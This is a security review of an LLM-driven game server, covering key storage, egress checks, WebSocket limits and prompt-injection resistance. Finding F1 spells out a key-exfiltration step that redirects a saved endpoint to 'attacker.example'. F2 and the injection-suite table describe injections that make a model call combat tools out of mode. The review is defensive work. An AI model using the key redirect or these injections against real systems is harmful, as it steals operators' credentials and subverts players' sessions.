# M2 security review (M2-40)

Scope: operator endpoint routes, key encryption and logging, the egress guard, the prompt boundary and
tool-call validation, the Room WebSocket gateway and combat commands. Reviewed on `origin/main` at
`29e5ccc` (includes M2-17/19/21/24/38). Static review plus the scripted injection suite
`tests/e2e/m2-injection.spec.ts`. This is not the M3 moderation review. No secret values were read,
printed or stored; no real endpoint was contacted.

Severity: High = exploitable by an unprivileged user or breaks a stated guarantee; Medium = needs a
privileged/seated actor or a missing control the spec expects; Low = hardening.
Status: `open` = listed for follow-up (no fix in this PR). Fix tickets are proposed, not yet filed.

## Summary

No High findings. Four Medium, five Low. The structural claim holds in the tested pipeline: across 30
hostile prompts, no state changed except through a schema-valid call to a supported tool, and player
text never appeared unquoted in the model request (table below).

## Findings

| ID | Sev | Area | Location | Status |
| --- | --- | --- | --- | --- |
| F1 | Medium | Key handling | `apps/server/src/llm/config.ts:226-231,303-352` | open |
| F2 | Medium | Prompt boundary | `apps/server/src/dm/orchestrator.ts:131-141,196-215`, `room/productionTurnRunner.ts:360` | open |
| F3 | Medium | WS / cost | `apps/server/src/room/Room.ts:334,682`, `gateway/ws.ts:146-157,179-186` | open |
| F4 | Medium | Key handling | `apps/server/src/llm/config.ts:47-60,100-148` | open |
| F5 | Low | Operator surface | `apps/server/src/routes/operator.ts:46,78,97` | open |
| F6 | Low | Key handling | `apps/server/src/llm/config.ts:233-235` | open |
| F7 | Low | Audit | `apps/server/src/llm/config.ts:250-253,316-319`, `routes/operator.ts:63-76` | open |
| F8 | Low | Egress | `apps/server/src/llm/egress.ts:244-249`, `llm/config.ts:196-203` | open |
| F9 | Low | Prompt boundary | `apps/server/src/dm/prompt.ts:128-138` | open |

### F1 (Medium) Saved key can be redirected to another host and read back

`saveEndpoint` keeps the stored key when `apiKey` is omitted (`config.ts:226-231`) but lets `baseUrl`
change in the same request. `testEndpoint` then decrypts the key and sends it as `Authorization` /
`x-api-key` to the new `baseUrl` (`config.ts:320-342`, `dialects/openai.ts:267`).
Exploit: an operator (or a stolen operator session) PUTs `{baseUrl:"https://attacker.example", ...}` with
no `apiKey`, then POSTs `/test`; the attacker's server receives the key. This defeats the write-only,
non-readback guarantee (US-O1 AC3 / R-S3). The egress guard does not help: the host is public and https.
Fix: when `baseUrl` (or `apiStyle`) changes and no new `apiKey` is supplied, either clear the key or reject
with 400 `KEY_REQUIRED`. Add a test: save with key, change host without key, assert key cleared/rejected.

### F2 (Medium) Tool "mode" gating is advisory; the executor accepts combat tools in exploration

The prompt filters combat tools out of the TOOLS text for exploration (`prompt.ts:81-93`), but native
tool definitions always list every tool (`orchestrator.ts:131-141`) and `executeTool` allow-lists names
without checking `activeMode` (`orchestrator.ts:196-215`). `productionTurnRunner.ts:360` hardcodes
`activeMode: 'exploration'`, so the prompt's combat branch is never selected there either.
Evidence: injection suite I09/I19, compromised model emits `attack`/`cast_spell` in exploration and the call
reaches the engine executor (it was rejected by engine legality, not by the boundary).
Exploit: a prompt injection that persuades the model to call `attack`/`start_combat` outside combat depends
solely on engine legality checks. Fix: pass the mode into the turn context and reject tools not in the
mode's allow-list with `unknown-tool` before execution; derive `activeMode` from `roomGameState`.

### F3 (Medium) No cap on queued actions or message rate (LLM cost / DoS)

`submitAction` appends to `queuedActions` with no per-seat or per-room bound (`Room.ts:334`), each entry
triggers a metered LLM turn; the gateway applies no rate limit beyond 64 KiB per frame and 32 pre-join
frames (`ws.ts:146-157`). A seated player (or a script) can queue thousands of 4000-char actions and burn
the operator's quota. Combat narration also enqueues turns (`Room.ts:682`).
Fix: cap queued actions per account (e.g. 3) and per room (e.g. 12), reply `ACTION_REJECTED` over the cap,
and add a token-bucket message rate per socket. Test: submit N+1 actions while a turn is in flight.

### F4 (Medium) Development key fallback and decrypt without production check

Outside `NODE_ENV=production`, a missing `OPERATOR_ENDPOINT_MASTER_KEY` silently uses a key derived from
a constant in source (`config.ts:52-60`). If a deployment forgets `NODE_ENV`, stored provider keys are
effectively unencrypted. `decryptEndpointKey` has no production guard at all and still honours the `dev`
key id (`config.ts:116-148`). `main.ts:18` only enforces the key when `NODE_ENV==='production'`.
Fix: require the master key unless `NODE_ENV` is explicitly `development` or `test`; refuse `dev` envelopes
when a master key is configured; log a startup warning when the fallback is used.

### F5 (Low) No Origin check on operator mutations

`validOrigin` protects auth routes and `/api/ws-ticket` but not operator PUT/POST/DELETE. The session cookie
is `SameSite=Lax; HttpOnly` and Fastify rejects non-JSON bodies on PUT, so cross-site CSRF is mostly blocked;
`POST .../test` and `DELETE` take no body. Fix: apply `validOrigin` to all `/api/operator` non-GET routes.

### F6 (Low) Fingerprint is an unsalted truncated SHA-256 of the key

`config.ts:233-235`: 12 hex chars of `sha256(key)`. Not reversible for high-entropy provider keys; weak for
low-entropy self-hosted keys and lets anyone with DB read access confirm a guess. Fix: use
`HMAC(masterKey, key)` truncated, or the last 4 characters of the key as many providers do.

### F7 (Low) Audit gaps

Audit rows record slot, action and actor but not the changed fields (host, model, key-changed flag) and
failed/denied attempts (invalid URL, 404 for non-operators) are not recorded. `tested` is logged before
the probe, and a probe failure is returned as a bare 503. Fix: add `details jsonb` (host only, `keyChanged`
boolean, fingerprint) and log rejected saves.

### F8 (Low) Local-host allow-list grants every port and any loopback service

An entry in `LLM_ALLOW_LOCAL_HOSTS` allows any port and plain http to that host (`egress.ts:244-249`),
including other loopback services (Postgres, admin ports). Acceptable for a trusted operator; the operator
guide should say so. Fix: optionally accept `host:port` entries. The duplicated http check in
`validateEndpointUrl` (`config.ts:196-203`) is redundant with the guard and compares a different
normalisation; remove it so there is one source of truth.

### F9 (Low) Session fields are data but not quoted as data

`premise`, `sceneSummary`, `partyRoster` (character names) and the display name inside `playerText` reach
the prompt as JSON/text (`prompt.ts:128-138`, `productionTurnRunner.ts:350-365`). They are JSON-escaped, and
player text itself is base64-quoted, but a character named with instruction text is not marked as data.
Fix: wrap session free-text fields with `quoteData` as is done for turns and registry facts.

## Checked and found sound

- Operator authz: 404 for non-operators and anonymous callers; operator identity needs an active, e-mail
  verified account (`verify.ts:21`) whose address is in `OPERATOR_EMAILS`; empty list means nobody.
- Responses and list endpoint never include the key; only `keySet` and the fingerprint. `Secret` redacts
  on `toString`/JSON/inspect; `apiKey` is in the pino redact list. Errors use fixed messages.
- Envelope: AES-256-GCM, random 12-byte nonce, AAD binds version and key id, key rotation by id.
- Egress guard: scheme and port limits, userinfo rejected, every DNS answer validated, connection pinned to
  the validated address (no rebinding), redirects refused, size and time caps, IPv4-mapped/NAT64/6to4/
  Teredo handled, metadata addresses and names blocked even for allow-listed hosts. No bypass found.
- WebSocket: one-shot 30 s ticket bound to account, session and auth token; origin checked on ticket and
  upgrade; seat/ownership required; frames capped at 64 KiB and strictly schema-validated; combat commands
  run under the Room actor and require a seat and an actor id from server state, never from the client.
- Prompt boundary: player text, history, registry and memory are base64-quoted data blocks; unknown tool
  names (including `__proto__`, `constructor`) and extra args are rejected; per-turn tool and retry budgets
  exist; `grant_item`/`consume_item` are not wired to the executor.

## Injection set result (30 prompts, `tests/e2e/m2-injection.spec.ts`)

Scope and limit: the model is scripted (no live LLM), so this proves the validation and boundary layers,
not a real model's refusal behaviour. "Resistant" = model ignores the injection; "compromised" = model
emits the tool call the injection asks for. Run:
`pnpm --filter @game/e2e exec vitest run m2-injection`.

| Result | Count |
| --- | --- |
| Resistant model: state unchanged, prompt contains only base64 form of text | 30 / 30 |
| Compromised model: blocked before executor (unknown tool, schema violation, unwired tool) | 28 / 30 |
| Compromised model: reached executor (I09 `attack`, I19 `cast_spell`; engine rejected, see F2) | 2 / 30 |
| State changed outside a tool path | 0 / 30 |

Acceptance mapping: report lists findings with severity, evidence and a proposed fix (waiver reasons
pending the human); no High findings; injection set shows zero state changes outside tool paths.
